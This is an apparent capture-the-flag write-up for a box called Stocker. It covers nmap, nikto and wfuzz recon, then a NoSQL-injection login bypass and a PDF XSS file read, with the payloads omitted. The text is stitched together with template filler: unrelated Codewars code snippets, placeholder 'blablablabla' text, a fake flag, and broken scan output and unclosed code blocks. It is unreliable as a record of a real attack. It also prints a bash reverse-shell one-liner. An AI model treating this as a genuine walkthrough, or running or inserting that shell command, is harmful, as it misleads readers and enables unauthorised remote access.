# Information Gathering

## Nmap
We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
$ nmap -A 10.10.11.196 -T4     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 08:14 EDT
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.19 seconds
```
From the above output we can see that ports, **22** and **80** are the ports open.

## Nikto

```console
$ nikto -host 10.10.11.196

Nothing interesting except that the server uses an outdated version of nginx.

## wfuzz
### Subdirectories:
Since we have a website then we scan the target for subdirectories.

```console
$ wfuzz -u http://stocker.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --hc 404

We found 3 subdirectories for the moment, none of which seems interesting.

### Subdomains:
Let's enumerate subdomains.

```console
$ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 301,404 -H "Host: FUZZ.stocker.htb" -u http://stocker.htb

```
We found 1 subdomain, let's see its content.

![Figure](../images/stocker1.png)

We found a login form, I tried to bypass it using hydra and a list of default usernames but it was obvious that it wasn't the way to go.

I intercepted a request to try SQLi but it didn't seem to work either.
I also noticed the "X-Powered-By:Express" but couldn't do much with it. 

After quite some time and a lot of googling I found <a href="https://expressjs.com/en/guide/database-integration.html">this page</a> about database integration of express, and I noticed some noSQL databases so I immediately thought of trying noSQL injection and see what that would give us.
Thanks to <a href="https://book.hacktricks.xyz/pentesting-web/login-bypass">HackTricks</a>, I could try some payloads and bingo: 

![Figure](../images/stocker2.png)

We got redirected to dev.stocker.htb/stock. From this page users can add items to cart then get a purchase receipt in PDF format. 

![Figure](../images/stocker3.png)

![Figure](../images/stocker4.png)

![Figure](../images/stocker5.png)

The PDF document is generated by an opensource graphics library called <a href="https://en.wikipedia.org/wiki/Skia_Graphics_Engine">Skia</a>, but I couldn't find any relative vulnerabilities.

Let's intercept the request and see wether there are any fields we can mess with in order to achieve some sort of LFI or XSS.

![Figure](../images/stocker6.png)

The title field appears on the pdf the document so I tried to insert my payloads there.

Thanks to <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">HackTricks</a> one more time I found some XSS dynamic PDF payloads and eventually one worked

I'll need to adjust the dimensions of the frame for a better view.

Now that I can read files, I tried to read some that contains sensitive informations or credentials:





Maybe we want to show some python code too, to let's take a look at a snipped from [codewars](https://www.codewars.com) to format time as human readable.

```python
def make_readable(seconds):        

    hours = seconds / 60**2
    minutes = seconds/60 - hours*60
    seconds = seconds - hours*(60**2) - minutes*60

    return '%02d:%02d:%02d' % (hours, minutes, seconds)
```


# Exploitation  

In order to gain our initial foothold we need to blablablabla. Here's another code snippet just for fun.

```php
function sqInRect($lng, $wdth) {

    if($lng == $wdth) {
      return null;
    }

    $squares = array();

    while($lng*$wdth >= 1) {
      if($lng>$wdth) {
        $base = $wdth;
        $lng = $lng - $base;
      }
      else {
        $base = $lng;
        $wdth = $wdth - $base;
      }
      array_push($squares, $base);
    }
    return $squares;
}
```
Above is the php code for the **Rectangle into Squares** kata solution from codewars.


## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.

# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
